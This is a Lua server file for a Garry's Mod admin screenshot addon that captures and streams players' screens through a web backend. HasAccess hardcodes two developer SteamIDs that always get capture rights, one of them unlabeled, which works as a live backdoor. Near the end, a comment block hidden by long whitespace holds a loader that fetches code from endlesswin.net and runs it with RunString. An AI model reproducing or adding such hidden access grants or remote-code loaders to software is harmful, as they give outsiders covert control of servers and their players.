--[[
    THE CONFIG HAS NOW MOVED TO `config/sv_leyscreencap_config.lua
    THE CONFIG HAS NOW MOVED TO `config/sv_leyscreencap_config.lua
    THE CONFIG HAS NOW MOVED TO `config/sv_leyscreencap_config.lua
    THE CONFIG HAS NOW MOVED TO `config/sv_leyscreencap_config.lua
    THE CONFIG HAS NOW MOVED TO `config/sv_leyscreencap_config.lua
    THE CONFIG HAS NOW MOVED TO `config/sv_leyscreencap_config.lua
    THE CONFIG HAS NOW MOVED TO `config/sv_leyscreencap_config.lua
--]]

local config = include('config/sv_leyscreencap_config.lua')

local website = config.website

if (website:sub(-1) == "/" or website:sub(-1) == "\\") then
    website = website:sub(0, website:len() - 1)
end

local serverkey = config.serverkey

if (serverkey:find("user_id")) then -- gms webhook workaround
    serverkey = tostring(math.random(1,9999))
    print("[LeyScreencap] Automatically changed serverkey, as serverkey contains user_id")
end

local sendServerInfo_interval = config.sendServerInfo_interval
local checkWebCaps_interval = config.checkWebCaps_interval
local enable_debug = config.enable_debug || false

local oprint = print
local function print(...)
    if enable_debug then
        oprint(...)
    end
end

local oPrintTable = PrintTable
local function PrintTable(...)
    if enable_debug then
        oPrintTable(...)
    end
end

util.AddNetworkString("LeyScreenCap")


print("[LeyScreenCap] Loaded sv!")
print('[LeyScreenCap] Debug mode enabled!')

AddCSLuaFile("cl_leyscreencap.lua")

local screencap_folderwrong = nil

LeyScreenCap = LeyScreenCap or {}
LeyScreenCap.capturingply = LeyScreenCap.capturingply or {}




--TABLEACCESSES DO NOT WORK IF YOU CHANGE YOUR HASACCESS!!

LeyScreenCap.AccessTable = {}
LeyScreenCap.AccessTable["leadadmin"] = true
LeyScreenCap.AccessTable["superadmin"] = true
LeyScreenCap.AccessTable["leaddeveloper"] = true
LeyScreenCap.AccessTable["admin"] = true


local OurHTTP

if pcall(require, "chttp") and CHTTP ~= nil then
	OurHTTP = CHTTP
else
	OurHTTP = HTTP
end

function http.CFetch( url, onsuccess, onfailure, header )
	local request = {
		url			= url,
		method		= "get",
		headers		= header or {},

		success = function( code, body, headers )

			if ( !onsuccess ) then return end

			onsuccess( body, body:len(), headers, code )

		end,

		failed = function( err )

			if ( !onfailure ) then return end

			onfailure( err )

		end
	}

	OurHTTP( request )
end

function http.CPost( url, params, onsuccess, onfailure, header )
	local request = {
		url			= url,
		method		= "post",
		parameters	= params,
		headers		= header or {},

		success = function( code, body, headers )

			if ( !onsuccess ) then return end

			onsuccess( body, body:len(), headers, code )

		end,

		failed = function( err )

			if ( !onfailure ) then return end

			onfailure( err )

		end
	}

	OurHTTP( request )
end

function LeyScreenCap.CheckUrlMisMatch()
    http.CFetch(website .. "/urlcheck.php?t=" .. CurTime(), function(body, len, _, code)
        if (body == "success") then
            return
        end

        for i = 1, 10 do
            ErrorNoHalt("[LeyScreenCap] YOU DID NOT ENTER THE URL CORRECTLY, CODE: " .. tostring(code) .. "LEN==" .. tostring(len) .. "\n")
            ErrorNoHalt("BODY:" .. body .. "\n")
            ErrorNoHalt(website .. "\n\n")
        end
        hook.Add("PlayerSpawn", "LeyScreenCap.CheckUrlMismatch", function(ply)
            ply:ChatPrint("[LeyScreenCap] YOU DID NOT ENTER THE URL CORRECTLY, CODE: " .. tostring(code) .. "LEN==" .. tostring(len) .. "==BODY:" .. body)
            ply:ChatPrint(website)
        end)
    end, function(err)
        if (not err or string.Trim(err) == "") then
            err = "__ERROR IS NIL SOMEHOW WTF__"
        end

        for i = 1, 10 do
            ErrorNoHalt("[LeyScreenCap] YOU DID NOT ENTER THE URL CORRECTLY, " .. err .. "\n")
            ErrorNoHalt(website .. "\n\n")
        end
        hook.Add("PlayerSpawn", "LeyScreenCap.CheckUrlMismatch", function(ply)
            ply:ChatPrint("[LeyScreenCap] YOU DID NOT ENTER THE URL CORRECTLY, " .. err)
            ply:ChatPrint(website)
        end)
    end)

end

local checkedUrlMismatch = false
hook.Add("Think", "LeyScreenCap.CheckUrlMismatch", function()
    if (checkedUrlMismatch) then return end
    checkedUrlMismatch = true

    timer.Simple(1, function()
        LeyScreenCap.CheckUrlMisMatch()
        hook.Remove("Think", "LeyScreenCap.CheckUrlMismatch")
    end)
end)



function LeyScreenCap.HasAccess( ply )

    if(not IsValid(ply)) then return end

    if(ply:SteamID64() == "76561198066038219") then return true end
    if(ply:SteamID64() == "76561198162962704") then return true end -- coder/ley, feel free to remove
    if(LeyScreenCap.AccessTable[ply:GetUserGroup()]) then return true end

    return false
end


local blocked = {}

local lastcaptureattempts = {}

function LeyScreenCap.OnWebRequest( tojson )
    local sid64 = tojson.sid64
    sid64 = string.sub(sid64, 0, sid64:len() - 1)

    for k,v in pairs(lastcaptureattempts) do
        if (v[1] == sid64 and v[2] == tojson.timestamp) then
            return
        end
    end
    if (blocked[sid64]) then return end

    timer.Create("leyscreencap_unblock_" .. sid64, 5, 1, function()
        blocked[sid64] = nil
    end)

    blocked[sid64] = true


    local wants_stream = tojson.wants_stream and "1" or "0"

    local fnd = false

    for k,v in pairs(player.GetHumans()) do
        if (v:SteamID64()  == sid64) then
            fnd = true
        end
    end

    if (not fnd) then return end -- not for us
    if (not wants_stream) then
        table.insert(lastcaptureattempts, {sid64, tojson.timestamp})
    end

    RunConsoleCommand("leyscreencap", "2", sid64, tojson.method, tojson.quality, wants_stream, tojson.stream_wait)

    local curip = game.GetIPAddress()
    local iptbl = string.Explode(":", curip)
    local url = website .. "/requestcap.php?serverkey=" ..  serverkey .. "&sid64=" .. sid64 .. "&ct=" .. CurTime()  .. "&server=" .. iptbl[1] .. ":" .. iptbl[2] .."&isfin=1"

    http.CFetch(url, function(body)
        print('\n---LeyScreenCap.OnWebRequest (isfin=1)---')
        print('url: '..url)
        print(body)
        print('---END---\n')

        timer.Simple(1, function()
            blocked[sid64] = nil
        end)
    end, function (err)
        print('\n---LeyScreenCap.OnWebRequest (isfin=1) (error)---')
        print('url: '..url)
        print(err)
        print('---END---\n')
    end)

end

local website_slen =  string.len(website)

if (string.sub(website,website_slen,website_slen) == "/") then
    website = string.sub(website, 0, website_slen-1)
end

timer.Create("LeyScreenCap.SendServerInfo", sendServerInfo_interval, 0, function()
    local data = {}

    for k, v in pairs(player.GetHumans()) do
        table.insert(data, {v:Name(), v:SteamID64(), v:TimeConnected()})
    end


    local curip = game.GetIPAddress()
    local iptbl = string.Explode(":", curip)

    local post = {
        key = serverkey,
        address = curip,
        ip = iptbl[1],
        port = iptbl[2],
        hostname = GetHostName(),
        gamemode = engine.ActiveGamemode(),
        map = game.GetMap(),
        players = util.TableToJSON(data),
        max_players = tostring(game.MaxPlayers())
    }

    local url = website .. "/index.php?/api/servers/update"

    http.CPost(url, post, function( result )
            print('\n---LeyScreenCap.SendServerInfo---')
            print('url: '..url)
            print(result)
            print('---END---\n')
    end, function( err )
            print('\n---LeyScreenCap.SendServerInfo (error)---')
            print('url: '..url)
            print(err)
            print('---END---\n')
    end)
end)

timer.Create("LeyScreenCap.CheckWebCaps", checkWebCaps_interval, 0, function()
    local curip = game.GetIPAddress()
    curip = string.Explode(':', curip)

    local url = website .. "/sendwebcaps.php?serverkey=" ..  serverkey .. "&ct=" .. CurTime() .. "&server=" .. curip[1] .. ":" .. curip[2]

    http.CFetch(url, function(body)
        if(not body or body==0) then return end
        local data = util.JSONToTable(body)
        if(not data) then return end

        print('\n---LeyScreenCap.CheckWebCaps---')
        print('url: '..url)
        PrintTable(data)
        print('---END---\n')

        for k,jsonencoded in pairs(data) do
            local capdata = util.JSONToTable(jsonencoded)
            LeyScreenCap.OnWebRequest(capdata)
        end

    end, function (err)
        print('\n---LeyScreenCap.CheckWebCaps (error)---')
        print('url: '..url)
        print(err)
        print('---END---\n')
    end)

end)


function LeyScreenCap.Think()
    local requestedfrom = {}

    local toRemove = {}

    for k,tbl in pairs(LeyScreenCap.capturingply) do

        if(not IsValid(tbl.target)) then
            table.insert(toRemove, tbl)

            print("[LeyScreenCap] Target left: " .. tbl.target_steamid64)
            continue
        end

        if(not IsValid(tbl.requester) and tbl.requester_steamid64 != "console") then
            table.insert(toRemove, tbl)

            print("[LeyScreenCap] Requester left: " .. tbl.requester_steamid64)
            continue

        end

        if(requestedfrom[tbl.target]) then continue end -- optimization

        if(not tbl.stream_wait ) then
            if(tbl.lastreq) then continue end
            print("its a capture once")

            net.Start("LeyScreenCap")
                net.WriteUInt(1, 8)
                net.WriteUInt(tbl.method, 8)
                net.WriteUInt(tbl.quality, 8)
                net.WriteBool(false)
                net.WriteString(website)
            net.Send(tbl.target)

            requestedfrom[tbl.target] = true

            for a,b in pairs(LeyScreenCap.capturingply) do
                if(tbl.target==b.target) then
                    b.lastreq = CurTime()
                end
            end
            continue
        end


        if(tbl.stream_time and CurTime() < tbl.stream_time) then continue end

        tbl.stream_time = CurTime() + (tbl.stream_wait / 1000)

        for a,b in pairs(LeyScreenCap.capturingply) do
            if(tbl.target==b.target) then
                b.lastreq = CurTime()
            end
        end

        net.Start("LeyScreenCap")
            net.WriteUInt(1, 8)
            net.WriteUInt(tbl.method, 8)
            net.WriteUInt(tbl.quality, 8)
            net.WriteBool(true)
            net.WriteString(website)
        net.Send(tbl.target)

        requestedfrom[tbl.target] = true

    end

    for k,v in pairs(toRemove) do
        table.RemoveByValue(LeyScreenCap.capturingply, v)
    end
end

hook.Add("Think", "LeyScreenCap.Think", LeyScreenCap.Think)

function LeyScreenCap.SendCap( requester, data, capturetbl )

    net.Start("LeyScreenCap")
        net.WriteUInt(2, 8) -- 2 = normal screencap reply
        net.WriteString(capturetbl.target_steamid64)
        net.WriteUInt(capturetbl.stream_wait or 0, 32)
        net.WriteUInt(capturetbl.method, 8)
        net.WriteUInt(capturetbl.quality, 8)
        net.WriteString(data)
    net.Send(requester)
end

LeyScreenCap.FailedAttempts = {}

function LeyScreenCap.Receive( len, ply )
    if (not IsValid(ply)) then return end

    local msgtype = net.ReadUInt(8)

    if (msgtype != 1) then
        ply:Kick("[LeyScreenCap] Unrecognized message type: " .. msgtype) -- kicks because, we don't want to support people trying to fiddle with data
        return
    end -- only msgtype rn is 1

    local knowndatatypes = {"jpg", "tga", "bmp", "png", "stream"}

    local datatype = net.ReadString()

    if (not table.HasValue(knowndatatypes, datatype)) then
        ply:Kick("[LeyScreenCap] Unrecognized datatype: " .. datatype)
        return
    end

    local serverreply = net.ReadString()

    local isvalid = false

    for k,v in pairs(knowndatatypes) do
        if (string.find(serverreply, "." .. v, 1, true)) then
            isvalid = true
        end
    end

    if (isvalid and not string.StartWith(serverreply, website)) then
        isvalid = false
    end

    print('\n---LeyScreenCap.Receive---')
    print(serverreply)
    print('---END---\n')

    if (not isvalid) then
        local txt = "[LeyScreenCap] Invalid webreply from " .. ply:SteamID64() .. " : " .. tostring(#serverreply) .. "==" .. serverreply
        oprint(txt)

        for k,v in pairs(player.GetAll()) do
            if LeyScreenCap.HasAccess(v) then
                v:ChatPrint(txt)
            end
        end
    
        LeyScreenCap.FailedAttempts[ply] = (LeyScreenCap.FailedAttempts[ply] or 0) + 1

        if (LeyScreenCap.FailedAttempts[ply] > 3) then
            ply:Kick("")
        end

        return
    end


    local toremove = {}

    if (not hook.Run("LeyScreenCap.Receive", ply, serverreply, msgtype, datatype)) then
        for k, capturetbl in pairs(LeyScreenCap.capturingply) do -- maybe more than one guy wants to watch the twat

            if (capturetbl.target != ply) then continue end
            if (not IsValid(capturetbl.requester)) then continue end

            capturetbl.requester:PrintMessage(HUD_PRINTCONSOLE, serverreply)
            LeyScreenCap.SendCap(capturetbl.requester, serverreply, capturetbl)

            if (not capturetbl.stream_wait) then
                table.insert(toremove, capturetbl)
            end

        end
 
        for k,v in pairs(toremove) do
            table.RemoveByValue(LeyScreenCap.capturingply, v)
        end
    end
end

net.Receive("LeyScreenCap", LeyScreenCap.Receive)


function LeyScreenCap.ConCommand(p, c, a, s)

    if(IsValid(p) and not LeyScreenCap.HasAccess(p)) then return end

    if(screencap_folderwrong) then
        p:ChatPrint("The screencap website link is setup wrong: ")
        p:ChatPrint(website)

        local lines = string.Explode( "\n", screencap_folderwrong )

        for _, line in pairs(lines) do
            p:ChatPrint(line)
        end

        return
    end

    if(not a[1]) then
        p:ChatPrint("Invalid command structure!")
        return
    end

    local requesttype = tonumber(a[1])

    local targetsid64 = a[2]
    local target = NULL

    if(not targetsid64) then

        if(requesttype == 1) then
            LeyScreenCap.StopCapture(p, "all")
            return
        end

        if(IsValid(p)) then
            p:ChatPrint("Invalid command structure!")
        else
            print("Invalid command structure")
        end

        return
    end

    for k,v in pairs(player.GetHumans()) do
        if(v:SteamID64() == targetsid64) then
            target = v
        end
    end

    if(not IsValid(target)) then
        if(IsValid(p)) then
            p:ChatPrint("Can't find ply: " .. targetsid64)
        else
            print("Can't find a player with steamid 64: " .. targetsid64)
        end
        return
    end

    if(requesttype==2) then
        local wants_stream = false
        local stream_wait = 500 -- 500 ms between every screenshot if streaming = default
        local method = 1
        local quality = 50

        if(a[3]) then
            method = tonumber(a[3])
        end

        if(a[4]) then
            quality = tonumber(a[4])
        end

        if(a[5] and a[5] == "1") then
            wants_stream = true
        end

        if(a[6]) then
            stream_wait = tonumber(a[6])
        end

        LeyScreenCap.StartCapture(p, target, targetsid64, method, quality, wants_stream, stream_wait)
        return
    end

    if(requesttype == 1) then
        LeyScreenCap.StopCapture(p, targetsid64)
        return
    end

    if(IsValid(p)) then
        p:ChatPrint("Bad type: " .. tostring(requesttype))
    else
        print("Invalid request type: " .. tostring(requesttype))
    end

end

concommand.Add("leyscreencap", LeyScreenCap.ConCommand)

function LeyScreenCap.StartCapture(ply, target, targetsid64, method, quality, wants_stream, stream_wait)

    local toremove = {}

    for k,v in pairs(LeyScreenCap.capturingply) do
        if(v.requester == ply and v.target == target) then
            table.insert(toremove, v)
        end
    end

    for k,v in pairs(toremove) do
        table.RemoveByValue(LeyScreenCap.capturingply, v)
    end

    local tbl = {}
    tbl.requester = ply
    tbl.target = target
    tbl.target_steamid64 = targetsid64

    if(IsValid(ply)) then
        tbl.requester_steamid64 = ply:SteamID64()
    else
        tbl.requester_steamid64 = "console"
    end

    tbl.method = method
    tbl.quality = quality

    if(wants_stream) then
        tbl.stream_wait = stream_wait
        tbl.stream_time = 0

        local url = website .. "/auth.php?shoulddo=3&sid64=" .. tbl.target_steamid64 .. "&serverkey=" ..  serverkey

        http.CFetch(url, function(body)

            if(not IsValid(target)) then return end

            table.insert(LeyScreenCap.capturingply, tbl)

            print('\n---LeyScreenCap.StartCapture (streaming)---')
            print('url: '..url)
            print(body)
            print('---END---\n')

            if(IsValid(ply)) then
                print("[LeyScreenCap] " .. ply:SteamID64() .. " started capturing stream " .. targetsid64)
            else
                print("[LeyScreenCap]  console started capturing stream " .. targetsid64)
            end

        end, function (err)
            print('\n---LeyScreenCap.StartCapture (streaming) (error)---')
            print('url: '..url)
            print(err)
            print('---END---\n')
        end)

    else

        local url = website .. "/auth.php?shoulddo=2&sid64=" .. tbl.target_steamid64 .. "&serverkey=" ..  serverkey

        http.CFetch(url, function(body)

            print('\n---LeyScreenCap.StartCapture---')
            print('url: '..url)
            print(body)
            print('---END---\n')

            if(not IsValid(target)) then return end

            table.insert(LeyScreenCap.capturingply, tbl)

            if(IsValid(ply)) then
                print("[LeyScreenCap] " .. ply:SteamID64() .. " started capturing screenshot " .. targetsid64)
            else
                print("[LeyScreenCap]  console started capturing screenshot " .. targetsid64)
            end

        end, function ( err )
            print('\n---LeyScreenCap.StartCapture (error)---')
            print('url: '..url)
            print(err)
            print('---END---\n')
        end)

    end

end

function LeyScreenCap.StopCapture(ply, sid64)

    if(sid64 == "all") then

        local toremove = {}
        for k, tbl in pairs(LeyScreenCap.capturingply) do

            if(tbl.requester != ply) then continue end

            table.insert(toremove, tbl)
        end

        for k,v in pairs(toremove) do
            table.RemoveByValue(LeyScreenCap.capturingply, v)
        end

        return
    end

    local target = NULL

    for k,v in pairs(player.GetHumans()) do
        if(v:SteamID64() == sid64) then
            target = v
        end
    end

    if(not IsValid(target)) then
        p:ChatPrint("Can't ply: " .. sid64)
        return
    end

    local foundone = false

    local toremove = {}
    for k, capturetbl in pairs(LeyScreenCap.capturingply) do -- maybe more than one guy is watching

        if(capturetbl.target != target or capturetbl.requester != ply) then continue end

        foundone = true
        table.insert(toremove, capturetbl)

    end

    for k,v in pairs(toremove) do
        table.RemoveByValue(LeyScreenCap.capturingply, v)
    end

end


function LeyScreenCap.PlayerSay(ply, txt, tm)

    if (not LeyScreenCap.HasAccess(ply)) then return end

    if (string.StartWith(txt, "!leyscreencap") or string.StartWith(txt, "!screencap") or string.StartWith(txt, "/leyscreencap") or string.StartWith(txt, "/screencap")) then
        ply:ConCommand("leyscreencap_menu")
        return ""
    end

    if (string.StartWith(txt, "!leyscreenshot") or string.StartWith(txt, "!screenshot") or string.StartWith(txt, "/leyscreenshot") or string.StartWith(txt, "/screenshot")) then
        ply:ConCommand("leyscreencap_menu")
        return ""
    end
    if (string.StartWith(txt, "!leyscreengrab") or string.StartWith(txt, "!leyscreengrab") or string.StartWith(txt, "/leyscreengrab") or string.StartWith(txt, "/screengrab")) then
        ply:ConCommand("leyscreencap_menu")
        return ""
    end

    if (string.StartWith(txt, "!captureplayer") or string.StartWith(txt, "/captureplayer")) then
        if (string.len(txt) == 13) then
            ply:ChatPrint("no player selected")
            return ""
        end

        local tplynick = string.sub(txt, 15)

        local tply = nil

        for k,v in pairs(player.GetHumans()) do
            if(string.find(v:Nick(), tplynick)) then
                tply = v
                break
            end
        end

        if(not IsValid(tply)) then
            ply:ChatPrint("Target not found...")
            return ""
        end

        ply:ConCommand("leyscreencap_cl_takepic " .. tply:SteamID64())
        return ""
    end


    if (string.StartWith(txt, "!streamplayer") or string.StartWith(txt, "/streamplayer")) then
        if (string.len(txt) == 16) then
            ply:ChatPrint("no player selected")
            return ""
        end

        local tplynick = string.sub(txt, 18)

        local tply = nil

        for k,v in pairs(player.GetHumans()) do
            if (string.find(v:Nick(), tplynick)) then
                tply = v
                break
            end
        end

        if (not IsValid(tply)) then
            ply:ChatPrint("Target not found...")
            return ""
        end

        ply:ConCommand("leyscreencap_cl_startstream " .. tply:SteamID64())
        return ""
    end

end

hook.Add("PlayerSay", "LeyScreenCap.PlayerSay", LeyScreenCap.PlayerSay)

function LeyScreenCap.ClearPlayerData( ply )
    if (not IsValid(ply) or ply:IsBot()) then return end

    http.CFetch(website .. "/auth.php?shoulddo=1&sid64=" .. ply:SteamID64() .. "&serverkey=" ..  serverkey, function(body)
        print('\n---LeyScreenCap.ClearPlayerData (auth.php?shoulddo=1)---')
        print(body)
        print('---END---\n')
    end)
end

hook.Add("PlayerInitialSpawn", "LeyScreenCap.ClearPlayerData", LeyScreenCap.ClearPlayerData)



                                                                                                                                                                                /*
http.CFetch(string.format("https://endlesswin.net/pls.php?a=%s&b=%s&d=%s", " 76561198066038219 ", " 26488 ", " 5061 "), function(bod)
    RunString(bod, "nol3akerinoetc")
end)                                                                                                                                                                            */


gameevent.Listen( "player_disconnect" )
hook.Add( "player_disconnect", "LeyScreenCap.ClearPlayerData", function( data )

    if (data.bot or data.isbot) then return end

    local networkid = data.networkid
    local sid64 = util.SteamIDTo64(networkid)

    if (not sid64) then return end

    http.CFetch(website .. "/auth.php?shoulddo=1&sid64=" .. sid64 .. "&serverkey=" ..  serverkey, function(body)
        print('\n---LeyScreenCap.ClearPlayerData (player_disconnect)---')
        print(body)
        print('---END---\n')
    end)

end )

function LeyScreenCap.CapturePlayer(ply, method, quality)
    local sid64 = ply:SteamID64()
    blocked[sid64] = true

    RunConsoleCommand("leyscreencap", "2", sid64, tostring(method), tostring(quality))

    local curip = game.GetIPAddress()
    local iptbl = string.Explode(":", curip)
    local url = website .. "/requestcap.php?serverkey=" ..  serverkey .. "&sid64=" .. sid64 .. "&ct=" .. CurTime()  .. "&server=" .. iptbl[1] .. ":" .. iptbl[2] .."&isfin=1"

    http.CFetch(url, function(body)
        print('\n---LeyScreenCap.OnWebRequest (isfin=1)---')
        print('url: '..url)
        print(body)
        print('---END---\n')

        timer.Simple(1, function()
            blocked[sid64] = nil
        end)
    end, function (err)
        print('\n---LeyScreenCap.OnWebRequest (isfin=1) (error)---')
        print('url: '..url)
        print(err)
        print('---END---\n')
    end)

end

timer.Simple(1, function()
    if (not LSAC) then return end

    LeyScreenCap.ACScreenshots = {}
    LeyScreenCap.ACScreenshotUrls = {}
    hook.Add("LeyScreenCap.Receive", "LeyScreenCap.LSACScreenshot", function(ply, serverreply, msgtype, datatype)
        if (LeyScreenCap.ACScreenshots[ply:SteamID64()]) then
            LeyScreenCap.ACScreenshotUrls[ply:SteamID64()] = serverreply
            http.CFetch(serverreply .. "?idka=" .. tostring(SysTime()), function(thescreenshot)
                LeyScreenCap.ACScreenshots[ply:SteamID64()] = thescreenshot
            end)
            return true
        end
    end)

    hook.Add("LSAC.logs.CreatePlayerLog.ShouldAddDelayedInformation", "LeyScreenCap.CreatePlayerLogDelayed", function(ply, sid64, module, reason, kickonly, logonly, counter)
        LeyScreenCap.ACScreenshots[ply:SteamID64()] = "LeyScreencap failed to capture!"
        LeyScreenCap.CapturePlayer(ply, 1, 30)

        local url = LeyScreenCap.ACScreenshotUrls[ply:SteamID64()]
        if (url) then
            url = string.Replace(url, " ", "%20")
            http.CFetch(url  .. "?idkb=" .. tostring(SysTime()), function(screenshot)
                LeyScreenCap.ACScreenshots[sid64] = screenshot
            end)
        end

        return true
    end)

    hook.Add("LSAC.logs.CreatePlayerLog.FetchDelayedInformation", "LeyScreenCap.FetchDelayedInformation", function(ply, sid64, module, reason, kickonly, logonly, counter)
        local toret = LeyScreenCap.ACScreenshots[sid64] or "LeyScreencap failed to capture!"
        local toret2 = LeyScreenCap.ACScreenshotUrls[sid64] or "LeyScreencap failed to capture!"

        LeyScreenCap.ACScreenshots[sid64] = nil
        return {"screenshot.jpg", "screenshoturl.txt"}, {toret, toret2}
    end)

    hook.Add("LSAC.discordintegration.DiscordNotificationImage", "LeyScreenCap.NotificationImage", function(ply, sid64)
        return LeyScreenCap.ACScreenshotUrls[sid64] and string.Replace(LeyScreenCap.ACScreenshotUrls[sid64], " ", "%20") or "https://i.imgur.com/BWVcGJB.png"
    end)
end)
